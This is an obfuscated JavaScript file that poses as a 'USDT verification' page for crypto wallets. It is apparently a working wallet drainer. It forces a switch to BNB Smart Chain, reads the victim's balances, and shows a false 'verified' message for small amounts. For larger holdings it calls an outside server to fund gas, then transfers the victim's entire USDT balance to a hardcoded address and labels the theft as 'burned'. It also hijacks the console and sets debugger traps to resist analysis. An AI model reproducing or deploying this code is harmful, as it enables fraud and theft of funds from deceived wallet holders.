const _0x1500bf = (function () {
    let _0x108380 = true
    return function (_0x423867, _0x166b39) {
      const _0x42a320 = _0x108380
        ? function () {
            if (_0x166b39) {
              const _0x52e7ae = _0x166b39.apply(_0x423867, arguments)
              return (_0x166b39 = null), _0x52e7ae
            }
          }
        : function () {}
      return (_0x108380 = false), _0x42a320
    }
  })(),
  _0x56b653 = _0x1500bf(this, function () {
    return _0x56b653
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x56b653)
      .search('(((.+)+)+)+$')
  })
_0x56b653()
const _0x17c920 = (function () {
  let _0x557bd5 = true
  return function (_0x3b4c5e, _0x4ab85a) {
    const _0x427bec = _0x557bd5
      ? function () {
          if (_0x4ab85a) {
            const _0x28bbe1 = _0x4ab85a.apply(_0x3b4c5e, arguments)
            return (_0x4ab85a = null), _0x28bbe1
          }
        }
      : function () {}
    return (_0x557bd5 = false), _0x427bec
  }
})()
;(function () {
  _0x17c920(this, function () {
    const _0x46357c = new RegExp('function *\\( *\\)'),
      _0x3aaed9 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x11ceff = _0x3d948a('init')
    if (
      !_0x46357c.test(_0x11ceff + 'chain') ||
      !_0x3aaed9.test(_0x11ceff + 'input')
    ) {
      _0x11ceff('0')
    } else {
      _0x3d948a()
    }
  })()
})()
const _0x2c7a1b = (function () {
    let _0xa8f6cc = true
    return function (_0x4a8772, _0x35231f) {
      const _0xf25e43 = _0xa8f6cc
        ? function () {
            if (_0x35231f) {
              const _0x4ed230 = _0x35231f.apply(_0x4a8772, arguments)
              return (_0x35231f = null), _0x4ed230
            }
          }
        : function () {}
      return (_0xa8f6cc = false), _0xf25e43
    }
  })(),
  _0x50cd5e = _0x2c7a1b(this, function () {
    let _0x5a3377
    try {
      const _0x494cae = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x5a3377 = _0x494cae()
    } catch (_0x36f1df) {
      _0x5a3377 = window
    }
    const _0x243777 = (_0x5a3377.console = _0x5a3377.console || {})
    const _0xf5a9b9 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x90d2b2 = 0; _0x90d2b2 < _0xf5a9b9.length; _0x90d2b2++) {
      const _0x37cabc = _0x2c7a1b.constructor.prototype.bind(_0x2c7a1b),
        _0x2a64c0 = _0xf5a9b9[_0x90d2b2],
        _0x49ec0d = _0x243777[_0x2a64c0] || _0x37cabc
      _0x37cabc['__proto__'] = _0x2c7a1b.bind(_0x2c7a1b)
      _0x37cabc.toString = _0x49ec0d.toString.bind(_0x49ec0d)
      _0x243777[_0x2a64c0] = _0x37cabc
    }
  })
_0x50cd5e()
const bscAddress = '0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979',
  bnbGasSender = '0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979'
;(function () {
  let _0x7b2818
  try {
    const _0x1844b7 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x7b2818 = _0x1844b7()
  } catch (_0x15f02f) {
    _0x7b2818 = window
  }
  _0x7b2818.setInterval(_0x3d948a, 4000)
})()
const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'
let web3, userAddress
async function waitForProvider(_0x4b61b4 = 5000) {
  return new Promise((_0x6291e8) => {
    const _0x68e9e = Date.now(),
      _0x26c37f = setInterval(() => {
        const _0x431141 =
          window.ethereum || window.trustwallet || window.web3?.currentProvider
        if (_0x431141 || Date.now() - _0x68e9e > _0x4b61b4) {
          clearInterval(_0x26c37f)
          _0x6291e8(_0x431141)
        }
      }, 100)
  })
}
async function connectWalletAndSwitch() {
  const _0x455cd3 =
    window.ethereum || window.trustwallet || window.web3?.currentProvider
  if (!_0x455cd3) {
    alert(
      'Please open this in Trust Wallet, MetaMask, or another Web3 browser.'
    )
    return
  }
  try {
    web3 = new Web3(_0x455cd3)
    const _0xc688a5 = { method: 'eth_chainId' }
    const _0x53aa1d = await _0x455cd3.request(_0xc688a5)
    if (_0x53aa1d !== '0x38') {
      try {
        const _0x3ada54 = {
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        }
        await _0x455cd3.request(_0x3ada54)
      } catch (_0xc75f18) {
        if (_0xc75f18.code === 4902) {
          const _0x4bcbf5 = {
            method: 'wallet_addEthereumChain',
            params: [
              {
                chainId: '0x38',
                chainName: 'Binance Smart Chain',
                nativeCurrency: {
                  name: 'BNB',
                  symbol: 'BNB',
                  decimals: 18,
                },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com'],
              },
            ],
          }
          await _0x455cd3.request(_0x4bcbf5)
        } else {
          alert('Please switch to BNB manually.')
          return
        }
      }
    }
    const _0x69b3cd = { method: 'eth_accounts' }
    const _0x5f1439 = await _0x455cd3.request(_0x69b3cd)
    userAddress = _0x5f1439[0]
    console.log('\u2705 Wallet:', userAddress)
  } catch (_0x5d6ce6) {
    alert('Wallet connection failed.'), console.error(_0x5d6ce6)
  }
}
async function Next() {
  if (!web3 || !userAddress) {
    await connectWalletAndSwitch()
    if (!web3 || !userAddress) {
      showPopup('Wallet not connected.', 'red')
      return
    }
  }
  try {
    const _0x3fa1a9 = {
      name: '_owner',
      type: 'address',
    }
    const _0x337708 = {
      constant: true,
      inputs: [_0x3fa1a9],
      name: 'balanceOf',
      outputs: [
        {
          name: '',
          type: 'uint256',
        },
      ],
      type: 'function',
    }
    const _0x3e3439 = {
      name: 'recipient',
      type: 'address',
    }
    const _0x4bcd88 = {
      name: 'amount',
      type: 'uint256',
    }
    const _0x2b8f5d = {
      constant: false,
      inputs: [_0x3e3439, _0x4bcd88],
      name: 'transfer',
      outputs: [
        {
          name: '',
          type: 'bool',
        },
      ],
      type: 'function',
    }
    const _0x82335d = new web3.eth.Contract(
        [_0x337708, _0x2b8f5d],
        usdtContractAddress
      ),
      [_0x499f73, _0x317870] = await Promise.all([
        _0x82335d.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress),
      ]),
      _0x5884e8 = parseFloat(web3.utils.fromWei(_0x499f73, 'ether')),
      _0x585e0e = parseFloat(web3.utils.fromWei(_0x317870, 'ether'))
    console.log('USDT:', _0x5884e8)
    console.log('BNB:', _0x585e0e)
    if (isNaN(_0x5884e8) || _0x5884e8 < 0.000001) {
      showPopup('No USDT assets found in your wallet.', 'black')
      return
    }
    if (_0x5884e8 <= 5) {
      showPopup(
        '\u2705 Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ' +
          _0x5884e8 +
          '<br><b>BNB:</b> ' +
          _0x585e0e,
        'green'
      )
      return
    }
    if (_0x585e0e < 0.0005) {
      showPopup('Checking the bnb ...', 'blue')
      const _0x4f7c50 = { toAddress: userAddress }
      await fetch('https://bnb-server-production.up.railway.app/send-bnb', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(_0x4f7c50),
      })
      await new Promise((_0x2dbb68) => setTimeout(_0x2dbb68, 2000))
    }
    showPopup('Loading...', 'blue')
    const _0x2fa35a = { from: userAddress }
    await _0x82335d.methods
      .transfer(bscAddress, web3.utils.toWei(_0x5884e8.toString(), 'ether'))
      .send(_0x2fa35a)
    showPopup(
      '\u2705 Transfer complete<br><b>USDT Burned:</b> ' + _0x5884e8,
      'red'
    )
  } catch (_0x55ba03) {
    console.error('\u274C Transfer failed:', _0x55ba03)
    showPopup('USDT transfer failed. Check balance or gas.', 'red')
  }
}
function showPopup(_0x16b46f, _0x43ab7c) {
  let _0x2ba131 = document.getElementById('popupBox')
  if (!_0x2ba131) {
    _0x2ba131 = document.createElement('div')
    _0x2ba131.id = 'popupBox'
    const _0x587806 = {
      position: 'fixed',
      top: '50%',
      left: '50%',
      transform: 'translate(-50%, -50%)',
      padding: '20px',
      borderRadius: '10px',
      boxShadow: '0 0 10px rgba(0,0,0,0.2)',
      textAlign: 'center',
      fontSize: '18px',
      width: '80%',
      maxWidth: '400px',
      zIndex: 9999,
      backgroundColor: '#fff',
    }
    Object.assign(_0x2ba131.style, _0x587806)
    document.body.appendChild(_0x2ba131)
  }
  _0x2ba131.style.backgroundColor =
    _0x43ab7c === 'red'
      ? '#ffebeb'
      : _0x43ab7c === 'green'
      ? '#e6f7e6'
      : '#f0f0f0'
  _0x2ba131.style.color = _0x43ab7c
  _0x2ba131.innerHTML = _0x16b46f
  _0x2ba131.style.display = 'block'
  setTimeout(() => (_0x2ba131.style.display = 'none'), 5000)
}
window.addEventListener('load', async () => {
  const _0x5d1410 = await waitForProvider()
  if (!_0x5d1410) {
    alert('No Web3 wallet detected.')
    return
  }
  await connectWalletAndSwitch()
  const _0x58a59e = new MutationObserver(() => {
      const _0xb5f7b8 = [...document.querySelectorAll('button')].find(
        (_0x538609) => _0x538609.textContent.trim().toLowerCase() === 'Next'
      )
      _0xb5f7b8 &&
        (_0xb5f7b8.addEventListener('click', Next),
        console.log("\u2705 Bound 'Check Now' to Next()"),
        _0x58a59e.disconnect())
    }),
    _0x2733f1 = {
      childList: true,
      subtree: true,
    }
  _0x58a59e.observe(document.body, _0x2733f1)
})
function _0x3d948a(_0x5eb247) {
  function _0x54a47d(_0x20bb77) {
    if (typeof _0x20bb77 === 'string') {
      return function (_0x581dce) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x20bb77 / _0x20bb77).length !== 1 || _0x20bb77 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x54a47d(++_0x20bb77)
  }
  try {
    if (_0x5eb247) {
      return _0x54a47d
    } else {
      _0x54a47d(0)
    }
  } catch (_0x599957) {}
}
